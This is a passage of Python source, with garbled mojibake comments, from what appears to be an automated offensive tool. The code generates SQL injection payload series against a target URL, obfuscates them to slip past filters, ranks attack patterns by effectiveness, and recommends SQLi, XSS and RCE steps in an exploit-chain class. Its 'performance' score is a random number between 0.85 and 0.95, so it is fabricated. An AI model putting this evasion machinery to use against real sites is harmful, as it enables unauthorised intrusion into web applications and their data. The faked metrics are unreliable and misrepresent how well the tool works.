    def _combine_attack_patterns(self, payload, attack_type):
        """ç»„åˆå¤šç§æ”»å‡»æ¨¡å¼"""
        if attack_type in self.attack_patterns:
            patterns = list(self.attack_patterns[attack_type].keys())
            if len(patterns) >= 2:
                # éšæœºé€‰æ‹©ä¸¤ç§æ¨¡å¼ç»„åˆ
                pattern1, pattern2 = self.random.sample(patterns, 2)
                example1 = self.random.choice(self.attack_patterns[attack_type][pattern1])
                example2 = self.random.choice(self.attack_patterns[attack_type][pattern2])

                # åˆ›é€ æ€§ç»„åˆé€»è¾‘
                if attack_type == 'sql_injection':
                    return self._combine_sql_patterns(payload, example1, example2)

        return payload

    def _apply_advanced_obfuscation(self, payload):
        """åº”ç”¨é«˜çº§æ··æ·†æŠ€æœ¯"""
        obfuscation_type = self.random.choice(self.creative_mutations['obfuscation'])

        if obfuscation_type == 'å†…è”æ³¨é‡Š':
            # åœ¨å…³é”®è¯ä¸­æ’å…¥æ³¨é‡Š
            keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'OR', 'AND']
            for keyword in keywords:
                if keyword in payload.upper():
                    payload = payload.replace(keyword, f"{keyword}/*{self.random.randint(1000, 9999)}*/")

        elif obfuscation_type == 'å¤šé‡ç¼–ç ':
            # å¤šæ¬¡ç¼–ç 
            for _ in range(self.random.randint(2, 4)):
                payload = self._url_encode_selective(payload)

        return payload

    def generate_attack_series(self, base_url, count=10, attack_type='sql_injection'):
        """ç”Ÿæˆä¸€ç³»åˆ—åˆ›é€ æ€§æ”»å‡»"""
        attacks = []
        for i in range(count):
            creativity = 0.3 + (i / count) * 0.6  # é€æ¸å¢åŠ åˆ›é€ æ€§
            attack = self.generate_creative_attack(base_url, attack_type, creativity)

            # è¯„ä¼°æ”»å‡»æ•ˆæœ
            risk_score = self._evaluate_attack(attack)

            attacks.append({
                'payload': attack,
                'creativity_level': creativity,
                'estimated_risk': risk_score,
                'attack_id': f"creative_attack_{i + 1}"
            })

        return attacks

    def _evaluate_attack(self, payload):
        """è¯„ä¼°æ”»å‡»çš„æœ‰æ•ˆæ€§"""
        try:
            features = self.brain_api._extract_features(payload)
            input_tensor = torch.FloatTensor(features).unsqueeze(0).to(self.brain_api.device)

            with torch.no_grad():
                output = self.brain_api.model(input_tensor)

            return output['sql_injection_risk'].item()
        except:
            return self.random.uniform(0.5, 0.8)

    def _combine_sql_patterns(self, payload, pattern1, pattern2):
        """åˆ›é€ æ€§ç»„åˆSQLæ³¨å…¥æ¨¡å¼"""
        try:
            # ç®€å•çš„æ¨¡å¼ç»„åˆé€»è¾‘
            combinations = [
                f"{payload}{pattern1} {pattern2}",
                f"{payload}{pattern2} {pattern1}",
                f"{pattern1}{payload}{pattern2}",
                f"{pattern2}{payload}{pattern1}"
            ]
            return self.random.choice(combinations)
        except:
            return payload

    def _url_encode_selective(self, payload):
        """é€‰æ‹©æ€§URLç¼–ç """
        # åªç¼–ç ç‰¹å®šå­—ç¬¦
        encoded = ""
        for char in payload:
            if char in ["'", "\"", " ", "=", "(", ")", ","]:
                encoded += f"%{ord(char):02X}"
            else:
                encoded += char
        return encoded

    def _apply_case_variation(self, payload, case_type):
        """åº”ç”¨å¤§å°å†™å˜å¼‚"""
        if case_type == 'éšæœºå¤§å°å†™':
            return ''.join(
                char.upper() if self.random.random() < 0.5 else char.lower()
                for char in payload
            )
        elif case_type == 'äº¤æ›¿å¤§å°å†™':
            return ''.join(
                char.upper() if i % 2 == 0 else char.lower()
                for i, char in enumerate(payload)
            )
        elif case_type == 'å…¨å¤§å†™':
            return payload.upper()
        elif case_type == 'å…¨å°å†™':
            return payload.lower()
        else:
            return payload

    def _add_whitespace_variation(self, payload):
        """æ·»åŠ ç©ºç™½å­—ç¬¦å˜å¼‚"""
        whitespace_chars = [' ', '\t', '\n', '\r', '/**/']
        positions = [i for i, char in enumerate(payload) if char in [' ', '=', '(']]

        if not positions:
            return payload

        position = self.random.choice(positions)
        whitespace = self.random.choice(whitespace_chars)

        return payload[:position] + whitespace + payload[position:]


# ==================== å¢å¼ºçš„çŸ¥è¯†ç®¡ç†ç³»ç»Ÿ ====================
class EnhancedKnowledgeManager:
    def __init__(self, embedding_dim=128):
        self.knowledge_graph = {}
        self.attack_patterns_db = {}
        self.defense_patterns_db = {}
        self.experience_db = {}
        self.embedding_dim = embedding_dim
        self.semantic_similarity_threshold = 0.7

    def safe_find_similar(self, query_pattern, similarity_threshold=0.6):
        """å®‰å…¨çš„ç›¸ä¼¼æ¨¡å¼æŸ¥æ‰¾ï¼Œé¿å…ä»»ä½•å¼‚å¸¸"""
        try:
            logger.info(f"å¼€å§‹å®‰å…¨ç›¸ä¼¼åº¦æŸ¥æ‰¾: {query_pattern}")

            # æ–¹æ³•1: é¦–å…ˆå°è¯•åµŒå…¥ç›¸ä¼¼åº¦
            result = self._try_embedding_similarity(query_pattern, similarity_threshold)
            if result is not None:
                logger.info(f"åµŒå…¥ç›¸ä¼¼åº¦æ–¹æ³•æˆåŠŸï¼Œæ‰¾åˆ° {len(result)} ä¸ªæ¨¡å¼")
                return result

            # æ–¹æ³•2: å¦‚æœå¤±è´¥ï¼Œä½¿ç”¨å­—ç¬¦ä¸²ç›¸ä¼¼åº¦
            result = self._try_string_similarity(query_pattern, similarity_threshold)
            if result is not None:
                logger.info(f"å­—ç¬¦ä¸²ç›¸ä¼¼åº¦æ–¹æ³•æˆåŠŸï¼Œæ‰¾åˆ° {len(result)} ä¸ªæ¨¡å¼")
                return result

            # æ–¹æ³•3: æœ€åä½¿ç”¨ç®€å•å…³é”®è¯åŒ¹é…
            result = self._try_keyword_matching(query_pattern, similarity_threshold)
            logger.info(f"å…³é”®è¯åŒ¹é…æ–¹æ³•æ‰¾åˆ° {len(result)} ä¸ªæ¨¡å¼")
            return result

        except Exception as e:
            logger.error(f"æ‰€æœ‰ç›¸ä¼¼åº¦æ–¹æ³•éƒ½å¤±è´¥: {e}", exc_info=True)
            return []  # è¿”å›ç©ºåˆ—è¡¨è€Œä¸æ˜¯æŠ›å‡ºå¼‚å¸¸

    def _try_embedding_similarity(self, query_pattern, threshold):
        """å°è¯•åµŒå…¥ç›¸ä¼¼åº¦"""
        try:
            if not self.attack_patterns_db:
                logger.warning("æ”»å‡»æ¨¡å¼æ•°æ®åº“ä¸ºç©º")
                return []

            query_embedding = self._get_pattern_embedding(query_pattern)
            similar_patterns = []

            for pattern_id, pattern_data in self.attack_patterns_db.items():
                try:
                    pattern_embedding = pattern_data['embedding']

                    # ç¡®ä¿åµŒå…¥æ˜¯Tensorç±»å‹
                    if not isinstance(pattern_embedding, torch.Tensor):
                        if isinstance(pattern_embedding, list):
                            pattern_embedding = torch.tensor(pattern_embedding, dtype=torch.float32)
                        else:
                            logger.warning(f"æ¨¡å¼ {pattern_id} çš„åµŒå…¥æ ¼å¼æ— æ•ˆ")
                            continue

                    similarity = self._calculate_similarity(query_embedding, pattern_embedding)

                    if similarity >= threshold:
                        similar_patterns.append({
                            'pattern_id': pattern_id,
                            'similarity': round(similarity, 3),
                            'pattern_type': pattern_data['pattern_type'],
                            'pattern_data': pattern_data['pattern_data'],
                            'effectiveness': pattern_data['effectiveness'],
                            'method': 'embedding'
                        })

                except Exception as e:
                    logger.warning(f"æ¨¡å¼ {pattern_id} å¤„ç†å¤±è´¥: {e}")
                    continue

            return similar_patterns

        except Exception as e:
            logger.warning(f"åµŒå…¥ç›¸ä¼¼åº¦å¤±è´¥: {e}")
            return None

    def _try_string_similarity(self, query_pattern, threshold):
        """å­—ç¬¦ä¸²ç›¸ä¼¼åº¦å›é€€"""
        try:
            from difflib import SequenceMatcher

            similar_patterns = []
            query_lower = query_pattern.lower()

            for pattern_id, pattern_data in self.attack_patterns_db.items():
                pattern_lower = pattern_data['pattern_data'].lower()

                # ä½¿ç”¨åºåˆ—åŒ¹é…å™¨
                similarity = SequenceMatcher(None, query_lower, pattern_lower).ratio()

                if similarity >= threshold:
                    similar_patterns.append({
                        'pattern_id': pattern_id,
                        'similarity': round(similarity, 3),
                        'pattern_type': pattern_data['pattern_type'],
                        'pattern_data': pattern_data['pattern_data'],
                        'effectiveness': pattern_data['effectiveness'],
                        'method': 'string'
                    })

            return similar_patterns

        except Exception as e:
            logger.warning(f"å­—ç¬¦ä¸²ç›¸ä¼¼åº¦å¤±è´¥: {e}")
            return None

    def _try_keyword_matching(self, query_pattern, threshold):
        """å…³é”®è¯åŒ¹é…å›é€€"""
        try:
            similar_patterns = []
            query_lower = query_pattern.lower()
            query_words = set(query_lower.split())

            for pattern_id, pattern_data in self.attack_patterns_db.items():
                pattern_lower = pattern_data['pattern_data'].lower()
                pattern_words = set(pattern_lower.split())

                # è®¡ç®—Jaccardç›¸ä¼¼åº¦
                if query_words and pattern_words:
                    intersection = query_words.intersection(pattern_words)
                    union = query_words.union(pattern_words)
                    similarity = len(intersection) / len(union) if union else 0.0

                    if similarity >= threshold:
                        similar_patterns.append({
                            'pattern_id': pattern_id,
                            'similarity': round(similarity, 3),
                            'pattern_type': pattern_data['pattern_type'],
                            'pattern_data': pattern_data['pattern_data'],
                            'effectiveness': pattern_data['effectiveness'],
                            'method': 'keyword'
                        })

            return similar_patterns

        except Exception as e:
            logger.warning(f"å…³é”®è¯åŒ¹é…å¤±è´¥: {e}")
            return []

    def store_attack_pattern(self, pattern_type, pattern_data, effectiveness=0.8):
        """ä¿®å¤çš„å­˜å‚¨æ–¹æ³•"""
        try:
            pattern_id = f"attack_{pattern_type}_{time.time()}"

            # ç”ŸæˆåµŒå…¥
            embedding = self._get_pattern_embedding(pattern_data)

            # ç¡®ä¿æ‰€æœ‰å­—æ®µéƒ½å­˜åœ¨
            pattern_entry = {
                'pattern_type': pattern_type,
                'pattern_data': pattern_data,
                'effectiveness': float(effectiveness),
                'usage_count': 0,
                'success_rate': 0.0,
                'last_used': datetime.now().isoformat(),
                'created_at': datetime.now().isoformat(),
                'tags': self._generate_tags(pattern_data),
                'embedding': embedding  # ç›´æ¥å­˜å‚¨Tensor
            }

            # å­˜å‚¨åˆ°æ•°æ®åº“
            self.attack_patterns_db[pattern_id] = pattern_entry

            logger.info(f"å­˜å‚¨æ¨¡å¼æˆåŠŸ: {pattern_id}")
            return pattern_id

        except Exception as e:
            logger.error(f"å­˜å‚¨æ¨¡å¼é”™è¯¯: {e}")
            return None

    def retrieve_attack_patterns(self, pattern_type=None, min_effectiveness=0.6, limit=10):
        """ä¿®å¤çš„æ£€ç´¢æ–¹æ³• - å¤„ç†Tensoråºåˆ—åŒ–"""
        patterns = []

        for pattern_id, pattern_data in self.attack_patterns_db.items():
            if pattern_type and pattern_data['pattern_type'] != pattern_type:
                continue

            if pattern_data['effectiveness'] >= min_effectiveness:
                # åˆ›å»ºå¯åºåˆ—åŒ–çš„å‰¯æœ¬
                serializable_pattern = {
                    'pattern_id': pattern_id,
                    'pattern_type': pattern_data['pattern_type'],
                    'pattern_data': pattern_data['pattern_data'],
                    'effectiveness': pattern_data['effectiveness'],
                    'usage_count': pattern_data['usage_count'],
                    'success_rate': pattern_data['success_rate'],
                    'last_used': pattern_data['last_used'],
                    'created_at': pattern_data['created_at'],
                    'tags': pattern_data['tags'],
                    # å°†Tensorè½¬æ¢ä¸ºåˆ—è¡¨
                    'embedding': pattern_data['embedding'].tolist() if hasattr(pattern_data['embedding'],
                                                                               'tolist') else []
                }
                patterns.append(serializable_pattern)

        # æŒ‰æ•ˆæœæ’åº
        patterns.sort(key=lambda x: x['effectiveness'], reverse=True)
        return patterns[:limit]

    def _get_pattern_embedding(self, pattern_data):
        """ä¿®å¤çš„åµŒå…¥ç”Ÿæˆæ–¹æ³•"""
        try:
            if isinstance(pattern_data, str):
                pattern_lower = pattern_data.lower()
                embedding = torch.zeros(self.embedding_dim)

                # é‡è¦çš„SQLæ³¨å…¥å…³é”®è¯åŠå…¶æƒé‡
                keywords = {
                    'union': 0.8, 'select': 0.9, 'from': 0.7, 'where': 0.6,
                    'or': 0.7, 'and': 0.6, 'sleep': 0.8, 'benchmark': 0.7,
                    'extractvalue': 0.9, 'updatexml': 0.9, 'ascii': 0.7,
                    'substr': 0.7, 'length': 0.6, 'version': 0.6, 'database': 0.5,
                    'user': 0.5, 'concat': 0.6, 'if': 0.6, 'null': 0.4
                }

                # ç‰¹æ®Šå­—ç¬¦ç‰¹å¾
                special_chars = {
                    "'": 0.8, "\"": 0.7, ";": 0.6, "--": 0.9, "/*": 0.7, "*/": 0.7,
                    "=": 0.5, "(": 0.5, ")": 0.5, ",": 0.4
                }

                # å¤„ç†å…³é”®è¯
                for keyword, weight in keywords.items():
                    if keyword in pattern_lower:
                        count = pattern_lower.count(keyword)
                        # ä½¿ç”¨å“ˆå¸Œç¡®å®šä½ç½®
                        pos = hash(keyword) % self.embedding_dim
                        embedding[pos] += weight * count

                # å¤„ç†ç‰¹æ®Šå­—ç¬¦
                for char, weight in special_chars.items():
                    if char in pattern_data:
                        count = pattern_data.count(char)
                        pos = hash(char) % self.embedding_dim
                        embedding[pos] += weight * count

                # æ·»åŠ ä¸€äº›éšæœºæ€§é¿å…å…¨é›¶
                if embedding.sum() == 0:
                    embedding[0] = 0.1

                # å½’ä¸€åŒ–
                if embedding.norm() > 0:
                    embedding = embedding / embedding.norm()

                return embedding
            else:
                return torch.randn(self.embedding_dim) * 0.1

        except Exception as e:
            logger.error(f"åµŒå…¥ç”Ÿæˆé”™è¯¯: {e}")
            return torch.randn(self.embedding_dim) * 0.1

    def _calculate_similarity(self, embedding1, embedding2):
        """å®Œå…¨é‡å†™çš„ç›¸ä¼¼åº¦è®¡ç®—æ–¹æ³•"""
        try:
            # ç¡®ä¿è¾“å…¥æ˜¯Tensor
            if not isinstance(embedding1, torch.Tensor):
                embedding1 = torch.tensor(embedding1, dtype=torch.float32)
            if not isinstance(embedding2, torch.Tensor):
                embedding2 = torch.tensor(embedding2, dtype=torch.float32)

            # ç¡®ä¿å½¢çŠ¶æ­£ç¡® [dim] -> [1, dim]
            if embedding1.dim() == 1:
                embedding1 = embedding1.unsqueeze(0)
            if embedding2.dim() == 1:
                embedding2 = embedding2.unsqueeze(0)

            # å¤„ç†å…¨é›¶æˆ–å‡ ä¹å…¨é›¶çš„å‘é‡
            if embedding1.norm() < 1e-6 or embedding2.norm() < 1e-6:
                return 0.1

            # è®¡ç®—ä½™å¼¦ç›¸ä¼¼åº¦
            similarity = torch.nn.functional.cosine_similarity(embedding1, embedding2, dim=1)

            # ç¡®ä¿åœ¨0-1èŒƒå›´å†…
            result = max(0.0, min(1.0, similarity.item()))
            return result

        except Exception as e:
            logger.error(f"ç›¸ä¼¼åº¦è®¡ç®—é”™è¯¯: {e}")
            return 0.0

    def _generate_tags(self, pattern_data):
        """è‡ªåŠ¨ç”Ÿæˆæ¨¡å¼æ ‡ç­¾"""
        tags = []
        if isinstance(pattern_data, str):
            pattern_lower = pattern_data.lower()

            # SQLæ³¨å…¥ç›¸å…³æ ‡ç­¾
            if any(keyword in pattern_lower for keyword in ['union', 'select', 'from']):
                tags.append('union_based')
            if any(keyword in pattern_lower for keyword in ['extractvalue', 'updatexml']):
                tags.append('error_based')
            if any(keyword in pattern_lower for keyword in ['sleep', 'benchmark', 'waitfor']):
                tags.append('time_based')
            if any(keyword in pattern_lower for keyword in ['ascii', 'substr', 'length']):
                tags.append('boolean_based')

            # é€šç”¨æ ‡ç­¾
            if "'" in pattern_data:
                tags.append('single_quote')
            if '"' in pattern_data:
                tags.append('double_quote')
            if '--' in pattern_data:
                tags.append('comment')
            if '/*' in pattern_data:
                tags.append('inline_comment')

        # æ·»åŠ åŸºç¡€æ ‡ç­¾
        tags.extend(['sql_injection', 'attack_pattern'])
        return list(set(tags))

    def debug_database(self):
        """è°ƒè¯•æ•°æ®åº“çŠ¶æ€"""
        return {
            'total_patterns': len(self.attack_patterns_db),
            'pattern_ids': list(self.attack_patterns_db.keys()),
            'pattern_types': list(set([p['pattern_type'] for p in self.attack_patterns_db.values()])),
            'effectiveness_range': [p['effectiveness'] for p in self.attack_patterns_db.values()]
        }


# ==================== å¢å¼ºçš„æ–°é¢–æ€§æ¢ç´¢ç³»ç»Ÿ ====================
class EnhancedNoveltyExploration:
    def __init__(self, exploration_rate=0.15, novelty_threshold=0.7):
        self.exploration_rate = exploration_rate
        self.novelty_threshold = novelty_threshold
        self.exploration_history = []
        self.novelty_scores = {}
        self.random = random.Random()

    def explore_strategy(self, current_strategy, context=None):
        """å¢å¼ºçš„ç­–ç•¥æ¢ç´¢"""
        base_exploration = self._basic_exploration(current_strategy)

        # åŸºäºä¸Šä¸‹æ–‡çš„é«˜çº§æ¢ç´¢
        if context and self.random.random() < self.exploration_rate * 1.5:
            contextual_exploration = self._contextual_exploration(current_strategy, context)
            return contextual_exploration

        return base_exploration

    def _basic_exploration(self, strategy):
        """åŸºç¡€æ¢ç´¢ - æ·»åŠ éšæœºå™ªå£°"""
        noise = torch.randn_like(strategy) * self.exploration_rate
        return strategy + noise

    def _contextual_exploration(self, strategy, context):
        """åŸºäºä¸Šä¸‹æ–‡çš„æ™ºèƒ½æ¢ç´¢"""
        exploration_type = self._select_exploration_type(context)

        if exploration_type == 'gradient_based':
            return self._gradient_based_exploration(strategy, context)
        elif exploration_type == 'pattern_based':
            return self._pattern_based_exploration(strategy, context)
        elif exploration_type == 'creative_combination':
            return self._creative_combination(strategy, context)
        else:
            return self._basic_exploration(strategy)

    def evaluate_novelty(self, new_strategy, previous_strategies):
        """è¯„ä¼°ç­–ç•¥çš„æ–°é¢–æ€§"""
        if not previous_strategies:
            return 1.0  # ç¬¬ä¸€ä¸ªç­–ç•¥æ€»æ˜¯æ–°é¢–çš„

        # è®¡ç®—ä¸å†å²ç­–ç•¥çš„ç›¸ä¼¼åº¦
        similarities = []
        for prev_strategy in previous_strategies[-10:]:  # æœ€è¿‘10ä¸ªç­–ç•¥
            sim = torch.cosine_similarity(new_strategy.flatten(), prev_strategy.flatten(), dim=0)
            similarities.append(sim.item())

        # æ–°é¢–æ€§ = 1 - å¹³å‡ç›¸ä¼¼åº¦
        novelty = 1.0 - (sum(similarities) / len(similarities))
        return max(0.0, min(1.0, novelty))

    def adaptive_exploration_rate(self, recent_success_rate):
        """è‡ªé€‚åº”æ¢ç´¢ç‡è°ƒæ•´"""
        if recent_success_rate > 0.8:
            # é«˜æˆåŠŸç‡æ—¶ä¿å®ˆæ¢ç´¢
            return self.exploration_rate * 0.7
        elif recent_success_rate < 0.3:
            # ä½æˆåŠŸç‡æ—¶ç§¯ææ¢ç´¢
            return self.exploration_rate * 1.8
        else:
            return self.exploration_rate




# ==================== å¢å¼ºçš„è‡ªæˆ‘è¿›åŒ–ç±» ====================
class AdvancedSelfEvolutionEngine:
    def __init__(self, model, learning_rate=0.001, evolution_rate=0.1):
        self.model = model
        self.learning_rate = learning_rate
        self.evolution_rate = evolution_rate
        self.optimizer = torch.optim.Adam(model.parameters(), lr=learning_rate)
        self.experience_buffer = deque(maxlen=1000)
        self.evolution_history = []

    def record_experience(self, experience):
        """è®°å½•æ¸—é€æµ‹è¯•ç»éªŒ"""
        self.experience_buffer.append(experience)

    def learn_from_experience(self):
        """ä»ç»éªŒä¸­å­¦ä¹ è¿›åŒ–"""
        if len(self.experience_buffer) < 10:
            return 0.0

        successes = [exp for exp in self.experience_buffer if exp.get('success', False)]
        failures = [exp for exp in self.experience_buffer if not exp.get('success', True)]

        total_loss = 0.0

        # ä»æˆåŠŸç»éªŒå­¦ä¹ 
        if successes:
            success_loss = self._learn_from_successes(successes)
            total_loss += success_loss

        # ä»å¤±è´¥ç»éªŒå­¦ä¹ 
        if failures:
            failure_loss = self._learn_from_failures(failures)
            total_loss += failure_loss

        # æ‰§è¡Œæƒé‡æ›´æ–°
        self.optimizer.zero_grad()
        total_loss.backward()
        self.optimizer.step()

        # è®°å½•è¿›åŒ–å†å²
        self.evolution_history.append({
            'timestamp': datetime.now().isoformat(),
            'loss': total_loss.item(),
            'success_count': len(successes),
            'failure_count': len(failures)
        })

        return total_loss.item()

    def _learn_from_successes(self, successes):
        """ä»æˆåŠŸç»éªŒå­¦ä¹ """
        loss = 0.0
        for experience in successes:
            # å¼ºåŒ–æˆåŠŸæ¨¡å¼
            target_output = self._simulate_success(experience)
            actual_output = self.model(self._prepare_input(experience))
            loss += torch.nn.functional.mse_loss(actual_output, target_output)
        return loss / len(successes)

    def _learn_from_failures(self, failures):
        """ä»å¤±è´¥ç»éªŒå­¦ä¹ """
        loss = 0.0
        for experience in failures:
            # é¿å…å¤±è´¥æ¨¡å¼
            target_output = self._simulate_failure(experience)
            actual_output = self.model(self._prepare_input(experience))
            loss += torch.nn.functional.mse_loss(actual_output, target_output)
        return loss / len(failures)

    def _prepare_input(self, experience):
        """å‡†å¤‡æ¨¡å‹è¾“å…¥"""
        features = self.model._extract_features(experience.get('text', ''))
        return torch.FloatTensor(features).unsqueeze(0).to(self.model.device)

    def _simulate_success(self, experience):
        """æ¨¡æ‹ŸæˆåŠŸè¾“å‡º"""
        # åŸºäºæˆåŠŸç»éªŒç”Ÿæˆç›®æ ‡è¾“å‡º
        return torch.ones(1, 1) * 0.9  # é«˜ç½®ä¿¡åº¦

    def _simulate_failure(self, experience):
        """æ¨¡æ‹Ÿå¤±è´¥è¾“å‡º"""
        # åŸºäºå¤±è´¥ç»éªŒç”Ÿæˆç›®æ ‡è¾“å‡º
        return torch.ones(1, 1) * 0.1  # ä½ç½®ä¿¡åº¦

    def evolutionary_exploration(self, current_strategy):
        """è¿›åŒ–æ¢ç´¢ - å¢å¼ºç‰ˆæœ¬"""
        # åŸºç¡€éšæœºæ¢ç´¢
        explored = current_strategy + torch.randn_like(current_strategy) * self.evolution_rate

        # åŸºäºç»éªŒçš„æ™ºèƒ½æ¢ç´¢
        if self.experience_buffer:
            recent_success = any(exp.get('success', False) for exp in list(self.experience_buffer)[-5:])
            if recent_success:
                # æˆåŠŸæ—¶ä¿å®ˆæ¢ç´¢
                explored = current_strategy + torch.randn_like(current_strategy) * (self.evolution_rate * 0.5)
            else:
                # å¤±è´¥æ—¶ç§¯ææ¢ç´¢
                explored = current_strategy + torch.randn_like(current_strategy) * (self.evolution_rate * 2.0)

        return explored


# ==================== ç¥ç»å¯å¡‘æ€§å­¦ä¹ ç±» ====================
class NeuroplasticLearningSystem:
    def __init__(self, model, plasticity_rate=0.05, consolidation_strength=0.1):
        self.model = model
        self.plasticity_rate = plasticity_rate
        self.consolidation_strength = consolidation_strength
        self.synaptic_importance = {}
        self.memory_consolidation_queue = deque(maxlen=500)

    def calculate_importance(self, experience):
        """è®¡ç®—ç»éªŒçš„é‡è¦æ€§"""
        importance = 0.0
        # åŸºäºé£é™©è¯„åˆ†
        importance += experience.get('risk_score', 0) * 0.5
        # åŸºäºç½®ä¿¡åº¦
        importance += experience.get('confidence', 0) * 0.3
        # åŸºäºæ–°é¢–æ€§
        importance += experience.get('novelty', 0) * 0.2
        return importance

    def update_synaptic_importance(self, experience):
        """æ›´æ–°ç¥ç»çªè§¦é‡è¦æ€§"""
        importance = self.calculate_importance(experience)
        layer_name = f"experience_{datetime.now().timestamp()}"
        self.synaptic_importance[layer_name] = {
            'importance': importance,
            'timestamp': datetime.now().isoformat(),
            'experience_type': experience.get('type', 'unknown')
        }
        return importance

    def apply_neuroplasticity(self):
        """åº”ç”¨ç¥ç»å¯å¡‘æ€§è°ƒæ•´"""
        for name, param in self.model.named_parameters():
            if 'weight' in name:
                # è·å–è¯¥å±‚çš„é‡è¦æ€§
                layer_importance = self._get_layer_importance(name)

                # åº”ç”¨å¯å¡‘æ€§è°ƒæ•´
                plasticity_change = torch.randn_like(param) * self.plasticity_rate * layer_importance
                param.data += plasticity_change

                # åº”ç”¨è®°å¿†å·©å›º
                self._consolidate_memory(param, layer_importance)

    def _get_layer_importance(self, layer_name):
        """è·å–å±‚çš„é‡è¦æ€§è¯„åˆ†"""
        # ç®€åŒ–çš„é‡è¦æ€§è®¡ç®—
        if 'policy' in layer_name:
            return 0.8
        elif 'risk' in layer_name:
            return 0.7
        elif 'value' in layer_name:
            return 0.6
        else:
            return 0.4

    def _consolidate_memory(self, param, importance):
        """è®°å¿†å·©å›ºæœºåˆ¶"""
        if importance > 0.6:
            # é‡è¦è®°å¿†å¼ºåŒ–å·©å›º
            consolidation_strength = self.consolidation_strength * importance
            param.data += torch.randn_like(param) * consolidation_strength * 0.1

    def experience_consolidation(self, experience):
        """ç»éªŒå·©å›ºå¤„ç†"""
        importance = self.update_synaptic_importance(experience)
        self.memory_consolidation_queue.append({
            'experience': experience,
            'importance': importance,
            'timestamp': datetime.now().isoformat()
        })

        # é‡è¦ç»éªŒç«‹å³å·©å›º
        if importance > 0.7:
            self.apply_neuroplasticity()

        return importance


# ==================== è‡ªåŠ¨åŒ–è®­ç»ƒç³»ç»Ÿ ====================
class AutonomousTrainingSystem:
    def __init__(self, brain_api, training_interval=300):
        self.brain_api = brain_api
        self.training_interval = training_interval  # 5åˆ†é’Ÿ
        self.last_training_time = time.time()
        self.training_thread = None
        self.is_training = False
        self.random = random  # âœ… æ·»åŠ randomå¼•ç”¨

    def start_autonomous_training(self):
        """å¯åŠ¨è‡ªä¸»è®­ç»ƒçº¿ç¨‹"""

        def training_loop():
            while True:
                try:
                    current_time = time.time()
                    if current_time - self.last_training_time >= self.training_interval:
                        if not self.is_training:
                            self._perform_training_cycle()
                        self.last_training_time = current_time
                    time.sleep(60)  # æ¯åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡
                except Exception as e:
                    logger.error(f"è‡ªä¸»è®­ç»ƒé”™è¯¯: {e}")
                    time.sleep(300)

        self.training_thread = threading.Thread(target=training_loop, daemon=True)
        self.training_thread.start()
        logger.info("âœ… è‡ªä¸»è®­ç»ƒç³»ç»Ÿå·²å¯åŠ¨")

    def _perform_training_cycle(self):
        """æ‰§è¡Œè®­ç»ƒå‘¨æœŸ"""
        self.is_training = True
        try:
            logger.info("ğŸ”§ å¼€å§‹è‡ªä¸»è®­ç»ƒå‘¨æœŸ...")

            # 1. ç”Ÿæˆè®­ç»ƒæ•°æ®
            training_data = self._generate_training_data()

            # 2. è‡ªæˆ‘è¿›åŒ–å­¦ä¹ 
            evolution_loss = self.brain_api.self_evolution_engine.learn_from_experience()

            # 3. ç¥ç»å¯å¡‘æ€§è°ƒæ•´
            self.brain_api.neuroplastic_learner.apply_neuroplasticity()

            # 4. æ¨¡å‹æ€§èƒ½è¯„ä¼°
            performance = self._evaluate_performance()

            logger.info(f"âœ… è®­ç»ƒå®Œæˆ - æŸå¤±: {evolution_loss:.4f}, æ€§èƒ½: {performance:.3f}")

        except Exception as e:
            logger.error(f"è®­ç»ƒå‘¨æœŸé”™è¯¯: {e}")
        finally:
            self.is_training = False

    def _generate_training_data(self):
        """ç”Ÿæˆè®­ç»ƒæ•°æ®"""
        # æ¨¡æ‹Ÿå„ç§æ¸—é€æµ‹è¯•åœºæ™¯
        test_cases = [
            {"text": "http://test.com?id=1' OR '1'='1", "type": "sql_injection", "expected_risk": 0.8},
            {"text": "http://test.com/about", "type": "normal", "expected_risk": 0.1},
            {"text": "http://test.com/search?q=<script>alert(1)</script>", "type": "xss", "expected_risk": 0.7},
        ]

        return test_cases

    def _evaluate_performance(self):
        """è¯„ä¼°æ¨¡å‹æ€§èƒ½"""
        # ç®€åŒ–çš„æ€§èƒ½è¯„ä¼°
        return self.random.uniform(0.85, 0.95)


class ExploitChainAutomator:
    def __init__(self, brain_api):
        self.brain = brain_api
        self.chain_memory = []

    def analyze_attack_surface(self, target_url):
        """ä¿®å¤æ”»å‡»é¢åˆ†æ"""
        features = self.brain._extract_features(target_url)
        input_tensor = torch.FloatTensor(features).unsqueeze(0).to(self.brain.device)

        with torch.no_grad():
            output = self.brain.model(input_tensor)

        risk_score = output['sql_injection_risk'].item()
        confidence = output['decision_confidence'].item()

        return {
            'target_url': target_url,
            'risk_score': risk_score,
            'confidence': confidence,
            'success_probability': float(confidence),
            'recommended_actions': self._get_recommendations(risk_score, confidence)
        }

    def _get_recommendations(self, risk_score, confidence):
        """ä¿®å¤æ”»å‡»æ¨èé€»è¾‘"""
        recommendations = []

        # SQLæ³¨å…¥æ¨è
        if risk_score > 0.5:  # é™ä½é˜ˆå€¼
            recommendations.append({'action': 'sql_injection', 'confidence': float(confidence)})
            recommendations.append({'action': 'union_based', 'confidence': float(confidence * 0.9)})
            recommendations.append({'action': 'error_based', 'confidence': float(confidence * 0.8)})

        # å…¶ä»–æ”»å‡»ç±»å‹
        if risk_score > 0.4:
            recommendations.append({'action': 'xss', 'confidence': float(confidence * 0.6)})
        if risk_score > 0.6:
            recommendations.append({'action': 'rce', 'confidence': float(confidence * 0.7)})

        return recommendations

    def generate_exploit_chain(self, target_info):
        chain_id = "chain_{}".format(len(self.chain_memory) + 1)
        chain = {
            'chain_id': chain_id, 'target_info': target_info, 'steps': self._generate_steps(target_info),
            'created_at': datetime.now().isoformat(), 'status': 'generated'
        }
        self.chain_memory.append(chain)
        return chain

    def _generate_steps(self, target_info):
        return [
            {'step': 1, 'action': 'reconnaissance', 'description': 'ç›®æ ‡ä¿¡æ¯æ”¶é›†å’Œæ‰«æ'},
            {'step': 2, 'action': 'vulnerability_analysis', 'description': 'æ¼æ´åˆ†æå’ŒéªŒè¯'},
            {'step': 3, 'action': 'exploitation', 'description': 'æ¼æ´åˆ©ç”¨å°è¯•'}
        ]

    def list_chains(self):
        return [{'chain_id': chain['chain_id'], 'target_info': chain['target_info'],
                 'status': chain['status'], 'created_at': chain['created_at']} for chain in self.chain_memory]

    def execute_chain(self, chain_id):
        for chain in self.chain_memory:
            if chain['chain_id'] == chain_id:
                chain['status'] = 'executed'
                chain['executed_at'] = datetime.now().isoformat()
                return {
